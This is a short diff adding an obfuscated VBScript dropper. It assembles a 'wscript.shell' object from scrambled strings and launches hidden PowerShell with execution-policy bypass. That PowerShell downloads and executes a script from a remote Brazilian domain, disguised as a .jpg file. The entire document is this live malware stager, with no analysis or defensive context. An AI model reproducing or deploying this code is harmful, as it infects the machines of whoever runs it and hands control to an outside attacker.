@@ -1,0 +1,4 @@
+Set trrmxvyb = CreateObject(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace("OEFpSleGvJLReEHDyCQdVRRvZddnYLfmOzaoMyfrleGvJnuIOcOyncGzVOkLzVOkL", "OEFpS", "w"), "leGvJ", "s"), "LReEH", "c"), "DyCQd", "r"), "VRRvZ", "i"), "ddnYL", "p"), "fmOza", "t"), "oMyfr", "."), "nuIOc", "h"), "OyncG", "e"), "zVOkL", "l"))
+ovmdokdh = ("POWeRS")
+trrmxvyb.Run((ovmdokdh)+"HeLL.eXe -WIND HIDDeN -eXeC BYPASS -NONI $SEYUSEHSEYH='IeX(NeW-OBJeCT NeT.W';$SEYSYSET='eBCLIeNT).DOWNLO';Sleep 2;[BYTe[]];Sleep 3;$HJDRRRUY='TUYDRDFDNYRDBBTRDVTDTNDRNJUYUMFUTDBT(''http://skynetx.com.br/info2.jpg'')'.RePLACe('TUYDRDFDNYRDBBTRDVTDTNDRNJUYUMFUTDBT','ADSTRING');Sleep 1;IeX($SEYUSEHSEYH+$SEYSYSET+$HJDRRRUY);"), CONSOLE_HIDE, CMD_WAIT
+Set ali = Nothing
